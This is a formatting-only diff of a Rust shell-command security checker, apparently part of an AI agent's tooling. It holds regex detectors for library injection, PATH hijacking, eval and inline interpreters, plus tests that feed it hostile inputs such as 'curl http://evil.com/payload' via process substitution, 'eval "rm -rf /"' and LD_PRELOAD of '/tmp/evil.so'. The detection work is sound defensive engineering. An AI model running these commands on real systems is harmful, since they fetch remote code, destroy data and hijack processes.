@@ -1,9 +1,7 @@
 use regex::Regex;
 use std::sync::LazyLock;
 
-use fastclaw_treesitter::shell_ast::{
-    self, ShellAst, ShellArg, nesting_depth,
-};
+use fastclaw_treesitter::shell_ast::{self, nesting_depth, ShellArg, ShellAst};
 
 /// Security verdict for a shell command.
 #[derive(Debug, Clone, PartialEq, Eq)]
@@ -51,11 +49,17 @@ static_regex!(RE_PROC_SUBST_ZSH, r"=\(");
 static_regex!(RE_ARITH_LEGACY, r"\$\[");
 static_regex!(RE_ZSH_EQUALS, r"(?:^|[\s;&|])=[a-zA-Z_]");
 static_regex!(RE_EVAL, r"(?:^|[\s;&|])(?:eval|source)\s");
-static_regex!(RE_XARGS_EXEC, r"xargs\s+.*(?:sh|bash|zsh|dash|ksh)\s+(?:-c|-e)");
+static_regex!(
+    RE_XARGS_EXEC,
+    r"xargs\s+.*(?:sh|bash|zsh|dash|ksh)\s+(?:-c|-e)"
+);
 static_regex!(RE_FIND_EXEC, r"find\s.*-exec\s");
 static_regex!(RE_AWK_SYSTEM, r"awk\s.*\bsystem\s*\(");
 static_regex!(RE_PATH_HIJACK, r"(?:^|[\s;&|])PATH\s*=");
-static_regex!(RE_LD_PRELOAD, r"(?:^|[\s;&|])(?:LD_PRELOAD|LD_LIBRARY_PATH|DYLD_INSERT_LIBRARIES|DYLD_LIBRARY_PATH)\s*=");
+static_regex!(
+    RE_LD_PRELOAD,
+    r"(?:^|[\s;&|])(?:LD_PRELOAD|LD_LIBRARY_PATH|DYLD_INSERT_LIBRARIES|DYLD_LIBRARY_PATH)\s*="
+);
 static_regex!(RE_PERL_EXEC, r"perl\s+-e\s");
 static_regex!(RE_PYTHON_EXEC, r"python[23]?\s+-c\s");
 
@@ -169,8 +173,7 @@ const PATTERNS: &[InjectionPattern] = &[
 
 /// Wrapper commands that are safe to strip before security analysis.
 const SAFE_WRAPPERS: &[&str] = &[
-    "timeout", "time", "nice", "nohup", "stdbuf", "env",
-    "ionice", "chrt", "taskset", "numactl",
+    "timeout", "time", "nice", "nohup", "stdbuf", "env", "ionice", "chrt", "taskset", "numactl",
 ];
 
 /// Shell security checker: detects 15 injection/substitution patterns.
@@ -477,11 +480,7 @@ impl AstSecurityChecker {
         Ok(findings)
     }
 
-    fn walk_ast(
-        ast: &ShellAst,
-        in_safe_context: bool,
-        findings: &mut Vec<AstSecurityFinding>,
-    ) {
+    fn walk_ast(ast: &ShellAst, in_safe_context: bool, findings: &mut Vec<AstSecurityFinding>) {
         match ast {
             ShellAst::Command { name, args, .. } => {
                 if matches!(name.as_str(), "eval" | "source") {
@@ -517,7 +516,12 @@ impl AstSecurityChecker {
             ShellAst::Function { body, .. } => {
                 Self::walk_ast(body, in_safe_context, findings);
             }
-            ShellAst::If { condition, then_body, elif_branches, else_body } => {
+            ShellAst::If {
+                condition,
+                then_body,
+                elif_branches,
+                else_body,
+            } => {
                 Self::walk_ast(condition, in_safe_context, findings);
                 Self::walk_ast(then_body, in_safe_context, findings);
                 for (c, b) in elif_branches {
@@ -552,11 +556,7 @@ impl AstSecurityChecker {
         }
     }
 
-    fn check_arg(
-        arg: &ShellArg,
-        in_safe_context: bool,
-        findings: &mut Vec<AstSecurityFinding>,
-    ) {
+    fn check_arg(arg: &ShellArg, in_safe_context: bool, findings: &mut Vec<AstSecurityFinding>) {
         match arg {
             ShellArg::SingleQuoted(_) => {
                 // Single-quoted content is always safe — no expansion occurs
@@ -613,13 +613,17 @@ mod tests {
     #[test]
     fn blocks_simple_command_substitution() {
         let v = ShellSecurityChecker::check("echo $(whoami)");
-        assert!(matches!(v, SecurityVerdict::Blocked { ref pattern, .. } if pattern == "command_substitution"));
+        assert!(
+            matches!(v, SecurityVerdict::Blocked { ref pattern, .. } if pattern == "command_substitution")
+        );
     }
 
     #[test]
     fn blocks_nested_command_substitution() {
         let v = ShellSecurityChecker::check("echo $(cat $(find / -name passwd))");
-        assert!(matches!(v, SecurityVerdict::Blocked { ref pattern, .. } if pattern == "command_substitution"));
+        assert!(
+            matches!(v, SecurityVerdict::Blocked { ref pattern, .. } if pattern == "command_substitution")
+        );
     }
 
     #[test]
@@ -633,7 +637,9 @@ mod tests {
     #[test]
     fn blocks_backtick_substitution() {
         let v = ShellSecurityChecker::check("echo `whoami`");
-        assert!(matches!(v, SecurityVerdict::Blocked { ref pattern, .. } if pattern == "backtick_substitution"));
+        assert!(
+            matches!(v, SecurityVerdict::Blocked { ref pattern, .. } if pattern == "backtick_substitution")
+        );
     }
 
     #[test]
@@ -653,13 +659,17 @@ mod tests {
     #[test]
     fn blocks_param_expansion_slice() {
         let v = ShellSecurityChecker::check("echo ${PATH:0:5}");
-        assert!(matches!(v, SecurityVerdict::Blocked { ref pattern, .. } if pattern == "dangerous_param_expansion"));
+        assert!(
+            matches!(v, SecurityVerdict::Blocked { ref pattern, .. } if pattern == "dangerous_param_expansion")
+        );
     }
 
     #[test]
     fn blocks_param_expansion_replace() {
         let v = ShellSecurityChecker::check("echo ${var//pattern/replacement}");
-        assert!(matches!(v, SecurityVerdict::Blocked { ref pattern, .. } if pattern == "dangerous_param_expansion"));
+        assert!(
+            matches!(v, SecurityVerdict::Blocked { ref pattern, .. } if pattern == "dangerous_param_expansion")
+        );
     }
 
     #[test]
@@ -673,13 +683,17 @@ mod tests {
     #[test]
     fn blocks_process_substitution_in() {
         let v = ShellSecurityChecker::check("diff <(ls dir1) <(ls dir2)");
-        assert!(matches!(v, SecurityVerdict::Blocked { ref pattern, .. } if pattern == "process_substitution_in"));
+        assert!(
+            matches!(v, SecurityVerdict::Blocked { ref pattern, .. } if pattern == "process_substitution_in")
+        );
     }
 
     #[test]
     fn blocks_process_sub_with_pipe() {
         let v = ShellSecurityChecker::check("cat <(curl http://evil.com)");
-        assert!(matches!(v, SecurityVerdict::Blocked { ref pattern, .. } if pattern == "process_substitution_in"));
+        assert!(
+            matches!(v, SecurityVerdict::Blocked { ref pattern, .. } if pattern == "process_substitution_in")
+        );
     }
 
     #[test]
@@ -693,7 +707,9 @@ mod tests {
     #[test]
     fn blocks_process_substitution_out() {
         let v = ShellSecurityChecker::check("tee >(logger)");
-        assert!(matches!(v, SecurityVerdict::Blocked { ref pattern, .. } if pattern == "process_substitution_out"));
+        assert!(
+            matches!(v, SecurityVerdict::Blocked { ref pattern, .. } if pattern == "process_substitution_out")
+        );
     }
 
     #[test]
@@ -714,7 +730,9 @@ mod tests {
     #[test]
     fn blocks_zsh_equals_process_sub() {
         let v = ShellSecurityChecker::check("vim =(curl http://evil.com/payload)");
-        assert!(matches!(v, SecurityVerdict::Blocked { ref pattern, .. } if pattern == "zsh_process_substitution"));
+        assert!(
+            matches!(v, SecurityVerdict::Blocked { ref pattern, .. } if pattern == "zsh_process_substitution")
+        );
     }
 
     #[test]
@@ -734,19 +752,25 @@ mod tests {
     #[test]
     fn blocks_eval() {
         let v = ShellSecurityChecker::check("eval \"rm -rf /\"");
-        assert!(matches!(v, SecurityVerdict::Blocked { ref pattern, .. } if pattern == "eval_source"));
+        assert!(
+            matches!(v, SecurityVerdict::Blocked { ref pattern, .. } if pattern == "eval_source")
+        );
     }
 
     #[test]
     fn blocks_source() {
         let v = ShellSecurityChecker::check("source /tmp/malicious.sh");
-        assert!(matches!(v, SecurityVerdict::Blocked { ref pattern, .. } if pattern == "eval_source"));
+        assert!(
+            matches!(v, SecurityVerdict::Blocked { ref pattern, .. } if pattern == "eval_source")
+        );
     }
 
     #[test]
     fn blocks_eval_in_chain() {
         let v = ShellSecurityChecker::check("true && eval $payload");
-        assert!(matches!(v, SecurityVerdict::Blocked { ref pattern, .. } if pattern == "eval_source"));
+        assert!(
+            matches!(v, SecurityVerdict::Blocked { ref pattern, .. } if pattern == "eval_source")
+        );
     }
 
     // ── xargs → shell (3 tests) ─────────────────────────────────────
@@ -754,13 +778,17 @@ mod tests {
     #[test]
     fn blocks_xargs_bash() {
         let v = ShellSecurityChecker::check("echo 'cmd' | xargs bash -c 'echo hello'");
-        assert!(matches!(v, SecurityVerdict::Blocked { ref pattern, .. } if pattern == "xargs_shell"));
+        assert!(
+            matches!(v, SecurityVerdict::Blocked { ref pattern, .. } if pattern == "xargs_shell")
+        );
     }
 
     #[test]
     fn blocks_xargs_sh() {
         let v = ShellSecurityChecker::check("cat cmds.txt | xargs -I {} sh -c '{}'");
-        assert!(matches!(v, SecurityVerdict::Blocked { ref pattern, .. } if pattern == "xargs_shell"));
+        assert!(
+            matches!(v, SecurityVerdict::Blocked { ref pattern, .. } if pattern == "xargs_shell")
+        );
     }
 
     #[test]
@@ -774,13 +802,17 @@ mod tests {
     #[test]
     fn confirms_find_exec() {
         let v = ShellSecurityChecker::check("find /tmp -name '*.sh' -exec chmod +x {} \\;");
-        assert!(matches!(v, SecurityVerdict::NeedsConfirmation { ref pattern, .. } if pattern == "find_exec"));
+        assert!(
+            matches!(v, SecurityVerdict::NeedsConfirmation { ref pattern, .. } if pattern == "find_exec")
+        );
     }
 
     #[test]
     fn confirms_find_exec_rm() {
         let v = ShellSecurityChecker::check("find . -type f -exec rm {} +");
-        assert!(matches!(v, SecurityVerdict::NeedsConfirmation { ref pattern, .. } if pattern == "find_exec"));
+        assert!(
+            matches!(v, SecurityVerdict::NeedsConfirmation { ref pattern, .. } if pattern == "find_exec")
+        );
     }
 
     #[test]
@@ -794,13 +826,17 @@ mod tests {
     #[test]
     fn blocks_awk_system() {
         let v = ShellSecurityChecker::check("awk '{system(\"rm \" $1)}' files.txt");
-        assert!(matches!(v, SecurityVerdict::Blocked { ref pattern, .. } if pattern == "awk_system"));
+        assert!(
+            matches!(v, SecurityVerdict::Blocked { ref pattern, .. } if pattern == "awk_system")
+        );
     }
 
     #[test]
     fn blocks_awk_system_inline() {
         let v = ShellSecurityChecker::check("ls | awk '{ system(\"cat \" $0) }'");
-        assert!(matches!(v, SecurityVerdict::Blocked { ref pattern, .. } if pattern == "awk_system"));
+        assert!(
+            matches!(v, SecurityVerdict::Blocked { ref pattern, .. } if pattern == "awk_system")
+        );
     }
 
     #[test]
@@ -814,13 +850,17 @@ mod tests {
     #[test]
     fn blocks_path_hijack() {
         let v = ShellSecurityChecker::check("PATH=/tmp/evil:$PATH ls");
-        assert!(matches!(v, SecurityVerdict::Blocked { ref pattern, .. } if pattern == "path_hijack"));
+        assert!(
+            matches!(v, SecurityVerdict::Blocked { ref pattern, .. } if pattern == "path_hijack")
+        );
     }
 
     #[test]
     fn blocks_path_hijack_in_chain() {
         let v = ShellSecurityChecker::check("true; PATH=/tmp/evil ls");
-        assert!(matches!(v, SecurityVerdict::Blocked { ref pattern, .. } if pattern == "path_hijack"));
+        assert!(
+            matches!(v, SecurityVerdict::Blocked { ref pattern, .. } if pattern == "path_hijack")
+        );
     }
 
     #[test]
@@ -834,19 +874,25 @@ mod tests {
     #[test]
     fn blocks_ld_preload() {
         let v = ShellSecurityChecker::check("LD_PRELOAD=/tmp/evil.so ls");
-        assert!(matches!(v, SecurityVerdict::Blocked { ref pattern, .. } if pattern == "library_injection"));
+        assert!(
+            matches!(v, SecurityVerdict::Blocked { ref pattern, .. } if pattern == "library_injection")
+        );
     }
 
     #[test]
     fn blocks_dyld_insert() {
         let v = ShellSecurityChecker::check("DYLD_INSERT_LIBRARIES=/tmp/hook.dylib ./app");
-        assert!(matches!(v, SecurityVerdict::Blocked { ref pattern, .. } if pattern == "library_injection"));
+        assert!(
+            matches!(v, SecurityVerdict::Blocked { ref pattern, .. } if pattern == "library_injection")
+        );
     }
 
     #[test]
     fn blocks_ld_library_path() {
         let v = ShellSecurityChecker::check("LD_LIBRARY_PATH=/evil ./target");
-        assert!(matches!(v, SecurityVerdict::Blocked { ref pattern, .. } if pattern == "library_injection"));
+        assert!(
+            matches!(v, SecurityVerdict::Blocked { ref pattern, .. } if pattern == "library_injection")
+        );
     }
 
     // ── perl -e (3 tests) ───────────────────────────────────────────
@@ -854,13 +900,17 @@ mod tests {
     #[test]
     fn confirms_perl_exec() {
         let v = ShellSecurityChecker::check("perl -e 'system(\"rm -rf /\")'");
-        assert!(matches!(v, SecurityVerdict::NeedsConfirmation { ref pattern, .. } if pattern == "perl_inline"));
+        assert!(
+            matches!(v, SecurityVerdict::NeedsConfirmation { ref pattern, .. } if pattern == "perl_inline")
+        );
     }
 
     #[test]
     fn confirms_perl_oneliner() {
         let v = ShellSecurityChecker::check("perl -e 'print 42'");
-        assert!(matches!(v, SecurityVerdict::NeedsConfirmation { ref pattern, .. } if pattern == "perl_inline"));
+        assert!(
+            matches!(v, SecurityVerdict::NeedsConfirmation { ref pattern, .. } if pattern == "perl_inline")
+        );
     }
 
     #[test]
@@ -874,13 +924,17 @@ mod tests {
     #[test]
     fn confirms_python_exec() {
         let v = ShellSecurityChecker::check("python3 -c 'import os; os.system(\"id\")'");
-        assert!(matches!(v, SecurityVerdict::NeedsConfirmation { ref pattern, .. } if pattern == "python_inline"));
+        assert!(
+            matches!(v, SecurityVerdict::NeedsConfirmation { ref pattern, .. } if pattern == "python_inline")
+        );
     }
 
     #[test]
     fn confirms_python2_exec() {
         let v = ShellSecurityChecker::check("python -c 'print(1+1)'");
-        assert!(matches!(v, SecurityVerdict::NeedsConfirmation { ref pattern, .. } if pattern == "python_inline"));
+        assert!(
+            matches!(v, SecurityVerdict::NeedsConfirmation { ref pattern, .. } if pattern == "python_inline")
+        );
     }
 
     #[test]
@@ -894,13 +948,17 @@ mod tests {
     #[test]
     fn blocks_legacy_arithmetic() {
         let v = ShellSecurityChecker::check("echo $[1+1]");
-        assert!(matches!(v, SecurityVerdict::Blocked { ref pattern, .. } if pattern == "legacy_arithmetic"));
+        assert!(
+            matches!(v, SecurityVerdict::Blocked { ref pattern, .. } if pattern == "legacy_arithmetic")
+        );
     }
 
     #[test]
     fn blocks_legacy_arith_complex() {
         let v = ShellSecurityChecker::check("x=$[RANDOM % 10]");
-        assert!(matches!(v, SecurityVerdict::Blocked { ref pattern, .. } if pattern == "legacy_arithmetic"));
+        assert!(
+            matches!(v, SecurityVerdict::Blocked { ref pattern, .. } if pattern == "legacy_arithmetic")
+        );
     }
 
     #[test]
@@ -918,7 +976,10 @@ mod tests {
 
     #[test]
     fn strip_timeout_with_suffix() {
-        assert_eq!(strip_wrappers("timeout 5s curl http://example.com"), "curl http://example.com");
+        assert_eq!(
+            strip_wrappers("timeout 5s curl http://example.com"),
+            "curl http://example.com"
+        );
     }
 
     #[test]
@@ -933,7 +994,10 @@ mod tests {
 
     #[test]
     fn strip_chained_wrappers() {
-        assert_eq!(strip_wrappers("timeout 30 nice -n 5 env FOO=1 cargo test"), "cargo test");
+        assert_eq!(
+            strip_wrappers("timeout 30 nice -n 5 env FOO=1 cargo test"),
+            "cargo test"
+        );
     }
 
     #[test]
@@ -961,7 +1025,9 @@ mod tests {
     #[test]
     fn blocks_through_wrapper() {
         let v = ShellSecurityChecker::check("timeout 30 eval 'rm -rf /'");
-        assert!(matches!(v, SecurityVerdict::Blocked { ref pattern, .. } if pattern == "eval_source"));
+        assert!(
+            matches!(v, SecurityVerdict::Blocked { ref pattern, .. } if pattern == "eval_source")
+        );
     }
 
     #[test]
@@ -980,13 +1046,19 @@ mod tests {
     #[test]
     fn ast_single_quote_no_false_positive() {
         let ast_v = AstSecurityChecker::check("echo '$(cmd)'");
-        assert!(ast_v.is_safe(), "AST should recognize single-quoted $() as safe");
+        assert!(
+            ast_v.is_safe(),
+            "AST should recognize single-quoted $() as safe"
+        );
     }
 
     #[test]
     fn ast_double_quote_detects_expansion() {
         let ast_v = AstSecurityChecker::check("echo \"$(cmd)\"");
-        assert!(!ast_v.is_safe(), "AST should detect $() inside double quotes");
+        assert!(
+            !ast_v.is_safe(),
+            "AST should detect $() inside double quotes"
+        );
     }
 
     #[test]
@@ -1006,8 +1078,12 @@ mod tests {
         let ast_v = AstSecurityChecker::check("echo $(echo $(echo $(whoami)))");
         assert!(!ast_v.is_safe());
         if let Ok(findings) = AstSecurityChecker::analyze("echo $(echo $(echo $(whoami)))") {
-            assert!(findings.iter().any(|f| f.category == "deep_nesting" || f.category == "command_substitution"),
-                "Deep nesting should be flagged");
+            assert!(
+                findings
+                    .iter()
+                    .any(|f| f.category == "deep_nesting" || f.category == "command_substitution"),
+                "Deep nesting should be flagged"
+            );
         }
     }
 
@@ -1044,7 +1120,10 @@ mod tests {
     #[test]
     fn ast_cmd_sub_in_loop_blocked() {
         let ast_v = AstSecurityChecker::check("for f in $(ls); do echo $f; done");
-        assert!(!ast_v.is_safe(), "AST should detect $() even in for loop word list");
+        assert!(
+            !ast_v.is_safe(),
+            "AST should detect $() even in for loop word list"
+        );
     }
 
     #[test]
@@ -1063,7 +1142,9 @@ mod tests {
     fn ast_analyze_returns_details() {
         if let Ok(findings) = AstSecurityChecker::analyze("echo $(whoami)") {
             assert!(!findings.is_empty());
-            assert!(findings.iter().any(|f| f.category == "command_substitution"));
+            assert!(findings
+                .iter()
+                .any(|f| f.category == "command_substitution"));
         }
         // Falls back to regex if bash parser unavailable
         let v = AstSecurityChecker::check("echo $(whoami)");
